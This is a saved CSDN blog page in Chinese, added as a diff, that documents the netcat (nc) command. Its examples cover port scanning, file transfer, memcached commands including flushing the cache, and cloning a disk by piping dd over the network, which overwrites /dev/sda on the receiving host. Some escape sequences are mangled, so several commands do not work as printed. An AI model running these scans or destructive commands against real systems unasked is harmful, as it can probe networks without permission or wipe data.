@@ -1,0 +1,1049 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0054)http://blog.csdn.net/xifeijian/article/details/9348277 -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">    
+    <script type="text/javascript" async="" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/ga.js"></script><script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/tracking.js" charset="utf-8"></script><style type="text/css"></style>  
+
+    <script type="text/javascript">
+        var protocol = window.location.protocol;
+        document.write('<script type="text/javascript" src="' + protocol + '//csdnimg.cn/pubfooter/js/repoAddr2.js?v=' + Math.random() + '"></' + 'script>');
+    </script><script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/repoAddr2.js"></script>
+
+
+    <script id="allmobilize" charset="utf-8" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/allmobilize.min.js"></script><style type="text/css"></style>
+ <meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" media="handheld" href="http://blog.csdn.net/xifeijian/article/details/9348277#">
+
+    <title>Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。
+        - 博客频道 - CSDN.NET</title>
+    
+    <meta name="description" content="linux nc命令使用详解    功能说明：功能强大的网络工具语　法：nc [-hlnruz][-g网关...&gt;][-G指向器数目&gt;][-i延迟秒数&gt;][-o输出文件&gt;][-p通信端口&gt;][-s来源位址&gt;][-v...][-w超时秒数&gt;][主机名称][通信端口...]参　数： -g网关&gt; 设置路由器跃程通信网关，最丢哦可设置8个。 -G指向器数目&gt; 设置来源路由指">
+    <script src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/jquery.js" type="text/javascript"></script>
+    <script type="text/javascript" src="http://static.blog.csdn.net/scripts/ad.js?v=1.1"></script>
+        <!--new top-->
+       
+        <link rel="stylesheet" href="http://static.csdn.net/public/common/toolbar/css/index.css">
+        <!--new top-->
+
+    <link rel="Stylesheet" type="text/css" href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/style.css">
+    <link id="RSSLink" title="RSS" type="application/rss+xml" rel="alternate" href="http://blog.csdn.net/xifeijian/rss/list">
+    <link rel="shortcut icon" href="http://csdnimg.cn/public/favicon.ico">
+    <link type="text/css" rel="stylesheet" href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/default.css">
+ 
+
+
+<script src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/share.js"></script><script type="text/javascript" charset="utf-8" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/main.js"></script><script charset="utf-8" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/sm.min.js" async=""></script><link type="text/css" rel="stylesheet" href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/style(1).css"><script src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/logger.js"></script><link href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/bdsstyle.css" rel="stylesheet" type="text/css"><link rel="stylesheet" href="http://bdimg.share.baidu.com/static/api/css/share_style0_16.css?v=1c17c4fd.css"><link rel="stylesheet" type="text/css" href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/style(2).css"></head>
+<body><iframe frameborder="0" style="display: none;"></iframe>
+    
+   
+      <!--new top-->
+    <script id="toolbar-tpl-scriptId" fixed="true" prod="blog" skin="black" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/html.js" type="text/javascript"></script><div class="csdn-toolbar csdn-toolbar-skin-black ">        <div class="container row center-block ">          <div class="col-md-3 pull-left logo clearfix"><a href="http://www.csdn.net/?ref=toolbar" title="CSDN首页" target="_blank" class="icon"></a><a title="频道首页" href="http://blog.csdn.net/?ref=toolbar_logo" target="_blank" class="img blog-icon"></a></div>          <div class="pull-right login-wrap unlogin">            <ul class="btns">              <li class="loginlink"><a href="https://passport.csdn.net/account/login?ref=toolbar" target="_top">登录&nbsp;</a>|<a target="_top" href="https://passport.csdn.net/account/register?ref=toolbar">&nbsp;注册</a></li>              <li class="search">                <div class="icon on-search-icon">                  <div class="wrap">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <form action="http://so.csdn.net/search" method="get" target="_blank">                      <input type="hidden" value="toolbar" name="ref" accesskey="2">                      <div class="border">                        <input placeholder="搜索" type="text" value="" name="q" accesskey="2"><span class="icon-enter-sm"></span>                      </div>                    </form>                  </div>                </div>              </li>              <li class="favor">                <div class="icon on-favor-icon">                  <div class="wrap">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <div style="display:none;" class="favor-success"><span class="msg">收藏成功</span>                      <div class="btns"><span class="btn btn-primary ok">确定</span></div>                    </div>                    <div style="display:none;" class="favor-failed"><span class="icon-danger-lg"></span><span class="msg">收藏失败，请重新收藏</span>                      <div class="btns"><span class="btn btn-primary ok">确定</span></div>                    </div>                    <form role="form" class="form-horizontal favor-form">                      <div class="form-group">                        <div class="clearfix">                          <label for="input-title" class="col-sm-2 control-label">标题</label>                          <div class="col-sm-10">                            <input id="inputTitle" type="text" placeholder="" class="title form-control">                          </div>                        </div>                        <div class="alert alert-danger"><strong></strong>标题不能为空</div>                      </div>                      <div class="form-group">                        <label for="input-url" class="col-sm-2 control-label">网址</label>                        <div class="col-sm-10">                          <input id="input-url" type="text" placeholder="" class="url form-control">                        </div>                      </div>                      <div class="form-group">                        <label for="input-tag" class="col-sm-2 tag control-label">标签</label>                        <div class="col-sm-10">                          <input id="input-tag" type="text" class="form-control tag">                        </div>                      </div>                      <div class="form-group">                        <label for="input-description" class="description col-sm-2 control-label">摘要</label>                        <div class="col-sm-10">                          <textarea id="input-description" class="form-control description"></textarea>                        </div>                      </div>                      <div class="form-group">                        <div class="col-sm-offset-2 col-sm-10 ft">                          <div class="col-sm-4 pull-left">                            <div class="checkbox">                              <label>                                <input type="checkbox" name="share" checked="checked" class="share">公开                              </label>                            </div>                          </div>                          <div class="col-sm-8 pull-right favor-btns">                            <button type="button" class="cancel btn btn-default">取消</button>                            <button type="submit" class="submit btn btn-primary">收藏</button>                          </div>                        </div>                      </div>                    </form>                  </div>                </div>              </li>              <li class="notify">                <div style="display:none" class="number"></div>                <div style="display:none" class="icon-hasnotes-sm"></div>                <div id="header_notice_num"></div>                <div class="icon on-notify-icon">                  <div class="wrap">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <div id="note1" class="csdn_note">                      <div class="box"></div>                    <iframe src="about:block" frameborder="0" allowtransparency="true" style="z-index:-1;position:absolute;top:0;left:0;width:100%;height:100%;background:transparent"></iframe></div>                  </div>                </div>              </li>              <li class="ugc">                <div class="icon on-ugc-icon">                  <div class="wrap clearfix">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <dl>                      <dt><a href="http://geek.csdn.net/news/expert?ref=toolbar" target="_blank" class="p-news clearfix"><em class="icon"></em><span>分享资讯</span></a></dt>                      <dt><a href="http://share.csdn.net/slides/new?ref=toolbar" target="_blank" class="p-doc clearfix"><em class="icon"></em><span>传PPT/文档</span></a></dt>                      <dt><a href="http://bbs.csdn.net/topics/new?ref=toolbar" target="_blank" class="p-ask clearfix"><em class="icon"></em><span>提问题</span></a></dt>                      <dt><a href="http://write.blog.csdn.net/postedit?ref=toolbar" target="_blank" class="p-blog clearfix"><em class="icon"></em><span>写博客</span></a></dt>                      <dt><a href="http://u.download.csdn.net/upload?ref=toolbar" target="_blank" class="p-src clearfix"><em class="icon"></em><span>传资源</span></a></dt>                      <dt><a href="https://code.csdn.net/projects/new?ref=toolbar" target="_blank" class="c-obj clearfix"><em class="icon"></em><span>创建项目</span></a></dt>                      <dt><a href="https://code.csdn.net/snippets/new?ref=toolbar" target="_blank" class="c-code clearfix"><em class="icon"></em><span>创建代码片</span></a></dt>                    </dl>                  </div>                </div>              </li>              <li class="profile">                <div class="icon on-profile-icon"><img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/100x100.jpg" class="curr-icon-img">                  <div class="wrap clearfix">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <div class="bd">                      <dl class="clearfix">                        <dt class="pull-left img"><a target="_blank" href="http://my.csdn.net/?ref=toolbar" class="avatar"><img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/100x100.jpg"></a></dt>                        <dd class="info"><a target="_blank" href="http://my.csdn.net/?ref=toolbar" class="nickname"></a><a class="set-nick" href="https://passport.csdn.net/account/profile">设置昵称<span class="write-icon"></span></a><span class="dec"><a class="fill-dec" href="http://my.csdn.net/" target="_blank">编辑自我介绍，让更多人了解你<span class="write-icon"></span></a></span></dd>                      </dl>                    </div>                    <div class="ft clearfix"><a target="_blank" href="http://my.csdn.net/my/account/changepwd?ref=toolbar" class="pull-left"><span class="icon-cog"></span>帐号设置</a><a href="https://passport.csdn.net/account/logout?ref=toolbar" target="_top" class="pull-left" style="margin-left:132px; width:18px; height:27px; white-space:nowrap; overflow:hidden;"><span class="icon-signout"></span><span class="out">退出</span></a></div>                  </div>                </div>              </li>              <li class="apps">                <div id="chasnew123" class="hasnew"></div>                <div id="cappsarea123" class="icon on-apps-icon">                  <div class="wrap clearfix">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                  <div class="detail">                    <dl>                      <dt>                        <h5>社区</h5>                      </dt>                      <dd> <a href="http://blog.csdn.net/?ref=toolbar" target="_blank">博客</a></dd>                      <dd> <a href="http://bbs.csdn.net/?ref=toolbar" target="_blank">论坛</a></dd>                      <dd> <a href="http://download.csdn.net/?ref=toolbar" target="_blank">下载</a></dd>                      <dd><a href="http://ask.csdn.net/?ref=toolbar" target="_blank">技术问答</a></dd>                      <dd><a href="http://geek.csdn.net/?ref=toolbar" target="_blank">极客头条</a></dd>                    </dl>                  </div>                  <div class="detail">                    <dl>                      <dt>                        <h5>服务</h5>                      </dt>                      <dd> <a href="https://code.csdn.net/?ref=toolbar" target="_blank">CODE</a></dd>                      <dd> <a href="http://hero.csdn.net/?ref=toolbar" target="_blank">英雄会</a></dd>                      <dd> <a href="http://huiyi.csdn.net/?ref=toolbar" target="_blank">活动</a></dd>                      <dd> <a href="http://www.csto.com/?ref=toolbar" target="_blank">CSTO</a></dd>                      <dd> <a href="http://mall.csdn.net/?ref=toolbar" target="_blank">C币兑换<img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/new.gif" style="margin-top: -26px;"></a></dd>                    </dl>                  </div>                  <div class="detail last">                    <dl>                      <dt>                        <h5>俱乐部</h5>                      </dt>                      <dd> <a href="http://cto.csdn.net/?ref=toolbar" target="_blank">CTO俱乐部</a></dd>                      <dd> <a href="http://student.csdn.net/?ref=toolbar" target="_blank">高校俱乐部</a></dd>                    </dl>                  </div>                </div>              </div>            </li>            </ul>          </div>        </div>    </div>
+     <!--new top-->
+    <div id="container">
+        <div id="header">
+    <div class="header">
+        <div id="blog_title">
+            <h2>
+                <a href="http://blog.csdn.net/xifeijian">上善若水，水善利万物而不争。</a></h2>
+            <h3>&gt;&gt;专注软件测试技术与质量管理，致力于软件自动化测试技术★性能测试技术★移动互联网★软件质量管理与过程改进。</h3>
+            <div class="clear">
+            </div>
+        </div>
+        <div class="clear">
+        </div>
+    </div>
+</div>
+<div id="navigator">
+    <div class="navigator_bg">
+    </div>
+    <div class="navigator">
+        <ul>
+                <li id="btnContents"><a href="http://blog.csdn.net/xifeijian?viewmode=contents"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_mulu&#39;])">
+                    <img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/ico_list.gif">目录视图</span></a></li>
+                <li id="btnView"><a href="http://blog.csdn.net/xifeijian?viewmode=list"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_zhaiyao&#39;])">
+                    <img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/ico_summary.gif">摘要视图</span></a></li>
+                <li id="btnRss"><a href="http://blog.csdn.net/xifeijian/rss/list"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_RSS&#39;])">
+                    <img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/ico_rss.gif">订阅</span></a></li>                
+
+            </ul>
+    </div>
+</div>
+<script type="text/javascript">
+    var username = "xifeijian";
+    var _blogger = username;
+    var blog_address = "http://blog.csdn.net/xifeijian";
+    var static_host = "http://static.blog.csdn.net";
+    var currentUserName = "";  
+</script>
+
+        <div id="body">
+            <div id="main">
+                <div class="main">
+                        <div class="ad_class">
+<div class="notice tracking-ad" data-mod="popu_3"> 
+
+
+<a href="http://www.csdn.net/article/2015-01-08/2823479-csdn-online-learning" target="_blank">
+<font color="blue">“CSDN学院”上线试运行</font></a>
+
+&nbsp;&nbsp;&nbsp;&nbsp;
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/41842837" target="_blank">
+<font color="red">《京东技术解密》有奖试读，礼品大放送
+</font></a>
+&nbsp;&nbsp;&nbsp;&nbsp;
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/42172979" target="_blank">
+<font color="blue">“我的2014”年度征文活动火爆开启
+</font></a>
+
+&nbsp;&nbsp;&nbsp;&nbsp;
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/42526281" target="_blank">
+<font color="red">11.1-12.31推荐文章汇总
+</font></a>
+</div>                        </div>
+                        
+
+  
+<link href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/comment1.css" type="text/css" rel="stylesheet">
+<link href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/style1.css" type="text/css" rel="stylesheet">
+<script language="JavaScript" type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/jquery.cookie.js"></script>
+<script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/main(1).js"></script>
+  <script type="text/ecmascript">
+      window.quickReplyflag = true;
+    </script>
+<div id="article_details" class="details">
+    <div class="article_title">   
+         <span class="ico ico_type_Original"></span>
+
+
+    <h1>
+        <span class="link_title"><a href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET.htm">
+        Linux Shell脚本编程－－nc命令使用详解
+        </a></span>
+    </h1>
+</div>
+
+    <div class="article_manage">
+        <span class="link_categories">
+        分类：
+            <a href="http://blog.csdn.net/xifeijian/article/category/1283126" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_fenlei&#39;]);">Linux</a> 
+            <a href="http://blog.csdn.net/xifeijian/article/category/1471505" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_fenlei&#39;]);">Linux Shell编程</a> 
+        </span>
+    <span class="link_postdate">2013-08-25 13:54</span>
+    <span class="link_view" title="阅读次数">2728人阅读</span>
+    <span class="link_comments" title="评论次数"><a href="http://blog.csdn.net/xifeijian/article/details/9348277#comments" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_pinglun&#39;])">评论</a>(0)</span>
+    <span class="link_collect"><a href="javascript:void(0);" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_shoucang&#39;]);collectArticle(&#39;Linux Shell脚本编程－－nc命令使用详解&#39;,&#39;9348277&#39;);return false;" title="收藏">收藏</a></span>
+    <span class="link_report"><a href="http://blog.csdn.net/xifeijian/article/details/9348277#report" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_jubao&#39;]);report(9348277,2);return false;" title="举报">举报</a></span>
+    
+</div>
+<div class="tag2box"><a href="http://www.csdn.net/tag/Linux" target="_blank" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_tag&#39;]);">Linux</a><a href="http://www.csdn.net/tag/nc" target="_blank" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_tag&#39;]);">nc</a><a href="http://www.csdn.net/tag/%e7%bd%91%e7%bb%9c%e5%b7%a5%e5%85%b7" target="_blank" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_tag&#39;]);">网络工具</a><a href="http://www.csdn.net/tag/shell" target="_blank" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_tag&#39;]);">shell</a></div>
+
+  
+    
+<div id="article_content" class="article_content">
+
+<p align="center"><strong><span style="font-family:Calibri">linux nc</span>命令使用详解</strong></p>
+<p><strong><span style="font-family:Calibri">&nbsp;&nbsp;&nbsp; </span></strong></p>
+<p><span style="font-size:14px">功能说明：功能强大的网络工具</span></p>
+<p><span style="font-size:14px">语　法：<span style="font-family:Calibri">nc [-hlnruz][-g&lt;</span>网关<span style="font-family:Calibri">...&gt;][-G&lt;</span>指向器数目<span style="font-family:Calibri">&gt;][-i&lt;</span>延迟秒数<span style="font-family:Calibri">&gt;][-o&lt;</span>输出文件<span style="font-family:Calibri">&gt;][-p&lt;</span>通信端口<span style="font-family:Calibri">&gt;][-s&lt;</span>来源位址<span style="font-family:Calibri">&gt;][-v...][-w&lt;</span>超时秒数<span style="font-family:Calibri">&gt;][</span>主机名称<span style="font-family:Calibri">][</span>通信端口<span style="font-family:Calibri">...]</span></span></p>
+<p><span style="font-size:14px">参　数：</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-g&lt;</span>网关<span style="font-family:Calibri">&gt;&nbsp;</span>设置路由器跃程通信网关，最丢哦可设置<span style="font-family:Calibri">8</span>个。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-G&lt;</span>指向器数目<span style="font-family:Calibri">&gt;&nbsp;</span>设置来源路由指向器，其数值为<span style="font-family:Calibri">4</span>的倍数。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-h&nbsp; </span>在线帮助。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-i&lt;</span>延迟秒数<span style="font-family:Calibri">&gt;&nbsp;</span>设置时间间隔，以便传送信息及扫描通信端口。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-l&nbsp; </span>使用监听模式，管控传入的资料。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-n&nbsp; </span>直接使用<span style="font-family:Calibri">IP</span>地址，而不通过域名服务器。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-o&lt;</span>输出文件<span style="font-family:Calibri">&gt;&nbsp;</span>指定文件名称，把往来传输的数据以<span style="font-family:Calibri">16</span>进制字码倾倒成该文件保存。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-p&lt;</span>通信端口<span style="font-family:Calibri">&gt;&nbsp;</span>设置本地主机使用的通信端口。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-r&nbsp; </span>乱数指定本地与远端主机的通信端口。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-s&lt;</span>来源位址<span style="font-family:Calibri">&gt;&nbsp;</span>设置本地主机送出数据包的<span style="font-family:Calibri">IP</span>地址。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-u&nbsp; </span>使用<span style="font-family:Calibri">UDP</span>传输协议。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-v </span>详细输出<span style="font-family:Calibri">--</span>用两个<span style="font-family:Calibri">-v</span>可得到更详细的内容</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;-w&lt;</span>超时秒数<span style="font-family:Calibri">&gt;&nbsp;</span>设置等待连线的时间。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;&nbsp;-z&nbsp; </span>使用<span style="font-family:Calibri">0</span>输入<span style="font-family:Calibri">/</span>输出模式，只在扫描通信端口时使用。</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">nc</span>使用示例</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">1. </span>端口扫描</p>
+<p><span style="font-family:Calibri; font-size:14px"># nc -v -w 2 192.168.2.34 -z 21-24</span></p>
+<p><span style="font-family:Calibri; font-size:14px">nc: connect to 192.168.2.34 port 21 (tcp) failed: Connection refused</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Connection to 192.168.2.34 22 port [tcp/ssh] succeeded!</span></p>
+<p><span style="font-family:Calibri; font-size:14px">nc: connect to 192.168.2.34 port 23 (tcp) failed: Connection refused</span></p>
+<p><span style="font-family:Calibri; font-size:14px">nc: connect to 192.168.2.34 port 24 (tcp) failed: Connection refused</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">2. </span>从<span style="font-family:Calibri">192.168.2.33</span>拷贝文件到<span style="font-family:Calibri">192.168.2.34</span></p>
+<p><span style="font-size:14px">在<span style="font-family:Calibri">192.168.2.34</span>上：<span style="font-family:Calibri"> nc -l 1234 &gt; test.txt</span></span></p>
+<p><span style="font-size:14px">在<span style="font-family:Calibri">192.168.2.33</span>上：<span style="font-family:Calibri"> nc 192.168.2.34 &lt; test.txt</span></span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">3. </span>简单聊天工具</p>
+<p><span style="font-size:14px">在<span style="font-family:Calibri">192.168.2.34</span>上：<span style="font-family:Calibri"> nc -l 1234</span></span></p>
+<p><span style="font-size:14px">在<span style="font-family:Calibri">192.168.2.33</span>上：<span style="font-family:Calibri"> nc 192.168.2.34 1234</span></span></p>
+<p><span style="font-size:14px">这样，双方就可以相互交流了。使用<span style="font-family:Calibri">ctrl+C(</span>或<span style="font-family:Calibri">D</span>）退出。</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">4. </span>用<span style="font-family:Calibri">nc</span>命令操作<span style="font-family:Calibri">memcached</span></p>
+<p><span style="font-family:Calibri; font-size:14px">1</span>）存储数据：<span style="font-family:Calibri">printf</span>“<span style="font-family:Calibri">set key 0 10 6rnresultrn</span>”<span style="font-family:Calibri"> |nc 192.168.2.34 11211</span></p>
+<p><span style="font-family:Calibri; font-size:14px">2</span>）获取数据：<span style="font-family:Calibri">printf</span>“<span style="font-family:Calibri">get keyrn</span>”<span style="font-family:Calibri"> |nc 192.168.2.34 11211</span></p>
+<p><span style="font-family:Calibri; font-size:14px">3</span>）删除数据：<span style="font-family:Calibri">printf</span>“<span style="font-family:Calibri">delete keyrn</span>”<span style="font-family:Calibri"> |nc 192.168.2.34 11211</span></p>
+<p><span style="font-family:Calibri; font-size:14px">4</span>）查看状态：<span style="font-family:Calibri">printf</span>“<span style="font-family:Calibri">statsrn</span>”<span style="font-family:Calibri"> |nc 192.168.2.34 11211</span></p>
+<p><span style="font-family:Calibri; font-size:14px">5</span>）模拟<span style="font-family:Calibri">top</span>命令查看状态：<span style="font-family:Calibri">watch</span>“<span style="font-family:Calibri">echo stats</span>”<span style="font-family:Calibri"> |nc 192.168.2.34
+ 11211</span></p>
+<p><span style="font-family:Calibri; font-size:14px">6</span>）清空缓存：<span style="font-family:Calibri">printf</span>“<span style="font-family:Calibri">flush_allrn</span>”<span style="font-family:Calibri"> |nc 192.168.2.34 11211 (</span>小心操作，清空了缓存就没了）</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">5. nc -p 1234 -w 5 host.example.com 80</span></p>
+<p><span style="font-size:14px">建立从本地<span style="font-family:Calibri">1234</span>端口到<span style="font-family:Calibri">host.example.com</span>的<span style="font-family:Calibri">80</span>端口连接，<span style="font-family:Calibri">5</span>秒超时</span></p>
+<p><span style="font-family:Calibri; font-size:14px">nc -u host.example.com 53</span></p>
+<p><span style="font-family:Calibri; font-size:14px">u</span>为<span style="font-family:Calibri">UDP</span>连接</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">6. echo -n "GET / HTTP/1.0"r"n"r"n" | nc host.example.com 80</span></p>
+<p><span style="font-size:14px">连接到主机并执行</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">7. nc -v -z host.example.com 70-80</span></p>
+<p><span style="font-size:14px">扫描端口<span style="font-family:Calibri">(70</span>到<span style="font-family:Calibri">80)</span>，可指定范围。<span style="font-family:Calibri">-v</span>输出详细信息。</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">8. </span>远程拷贝文件</p>
+<p><span style="font-size:14px">从<span style="font-family:Calibri">server1</span>拷贝文件到<span style="font-family:Calibri">server2</span>上。需要先在<span style="font-family:Calibri">server2</span>上，用<span style="font-family:Calibri">nc</span>激活监听，</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">server2</span>上运行：</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">root@hatest2 tmp]# nc -lp 1234 &gt; install.log</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">server1</span>上运行：</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">[root@hatest1 ~]# ll install.log</span></p>
+<p><span style="font-family:Calibri; font-size:14px">-rw-r</span>–<span style="font-family:Calibri">r</span>–<span style="font-family:Calibri">&nbsp; 1 root root 39693 12</span>月<span style="font-family:Calibri"> 20&nbsp; 2007 install.log</span></p>
+<p><span style="font-family:Calibri; font-size:14px">[root@hatest1 ~]# nc -w 1 192.168.228.222 1234 &lt; install.log</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">9. </span>克隆硬盘或分区</p>
+<p><span style="font-size:14px">操作与上面的拷贝是雷同的，只需要由<span style="font-family:Calibri">dd</span>获得硬盘或分区的数据，然后传输即可。</span></p>
+<p><span style="font-size:14px">克隆硬盘或分区的操作，不应在已经<span style="font-family:Calibri">mount</span>的的系统上进行。所以，需要使用安装光盘引导后，进入拯救模式（或使用<span style="font-family:Calibri">Knoppix</span>工具光盘）启动系统后，在<span style="font-family:Calibri">server2</span>上进行类似的监听动作：</span></p>
+<p><span style="font-family:Calibri; font-size:14px"># nc -l -p 1234 | dd of=/dev/sda</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">server1</span>上执行传输，即可完成从<span style="font-family:Calibri">server1</span>克隆<span style="font-family:Calibri">sda</span>硬盘到<span style="font-family:Calibri">server2</span>的任务：</p>
+<p><span style="font-family:Calibri; font-size:14px"># dd if=/dev/sda | nc 192.168.228.222 1234</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-size:14px">※完成上述工作的前提，是需要落实光盘的拯救模式支持服务器上的网卡，并正确配置<span style="font-family:Calibri">IP</span>。</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">10. </span>保存<span style="font-family:Calibri">Web</span>页面</p>
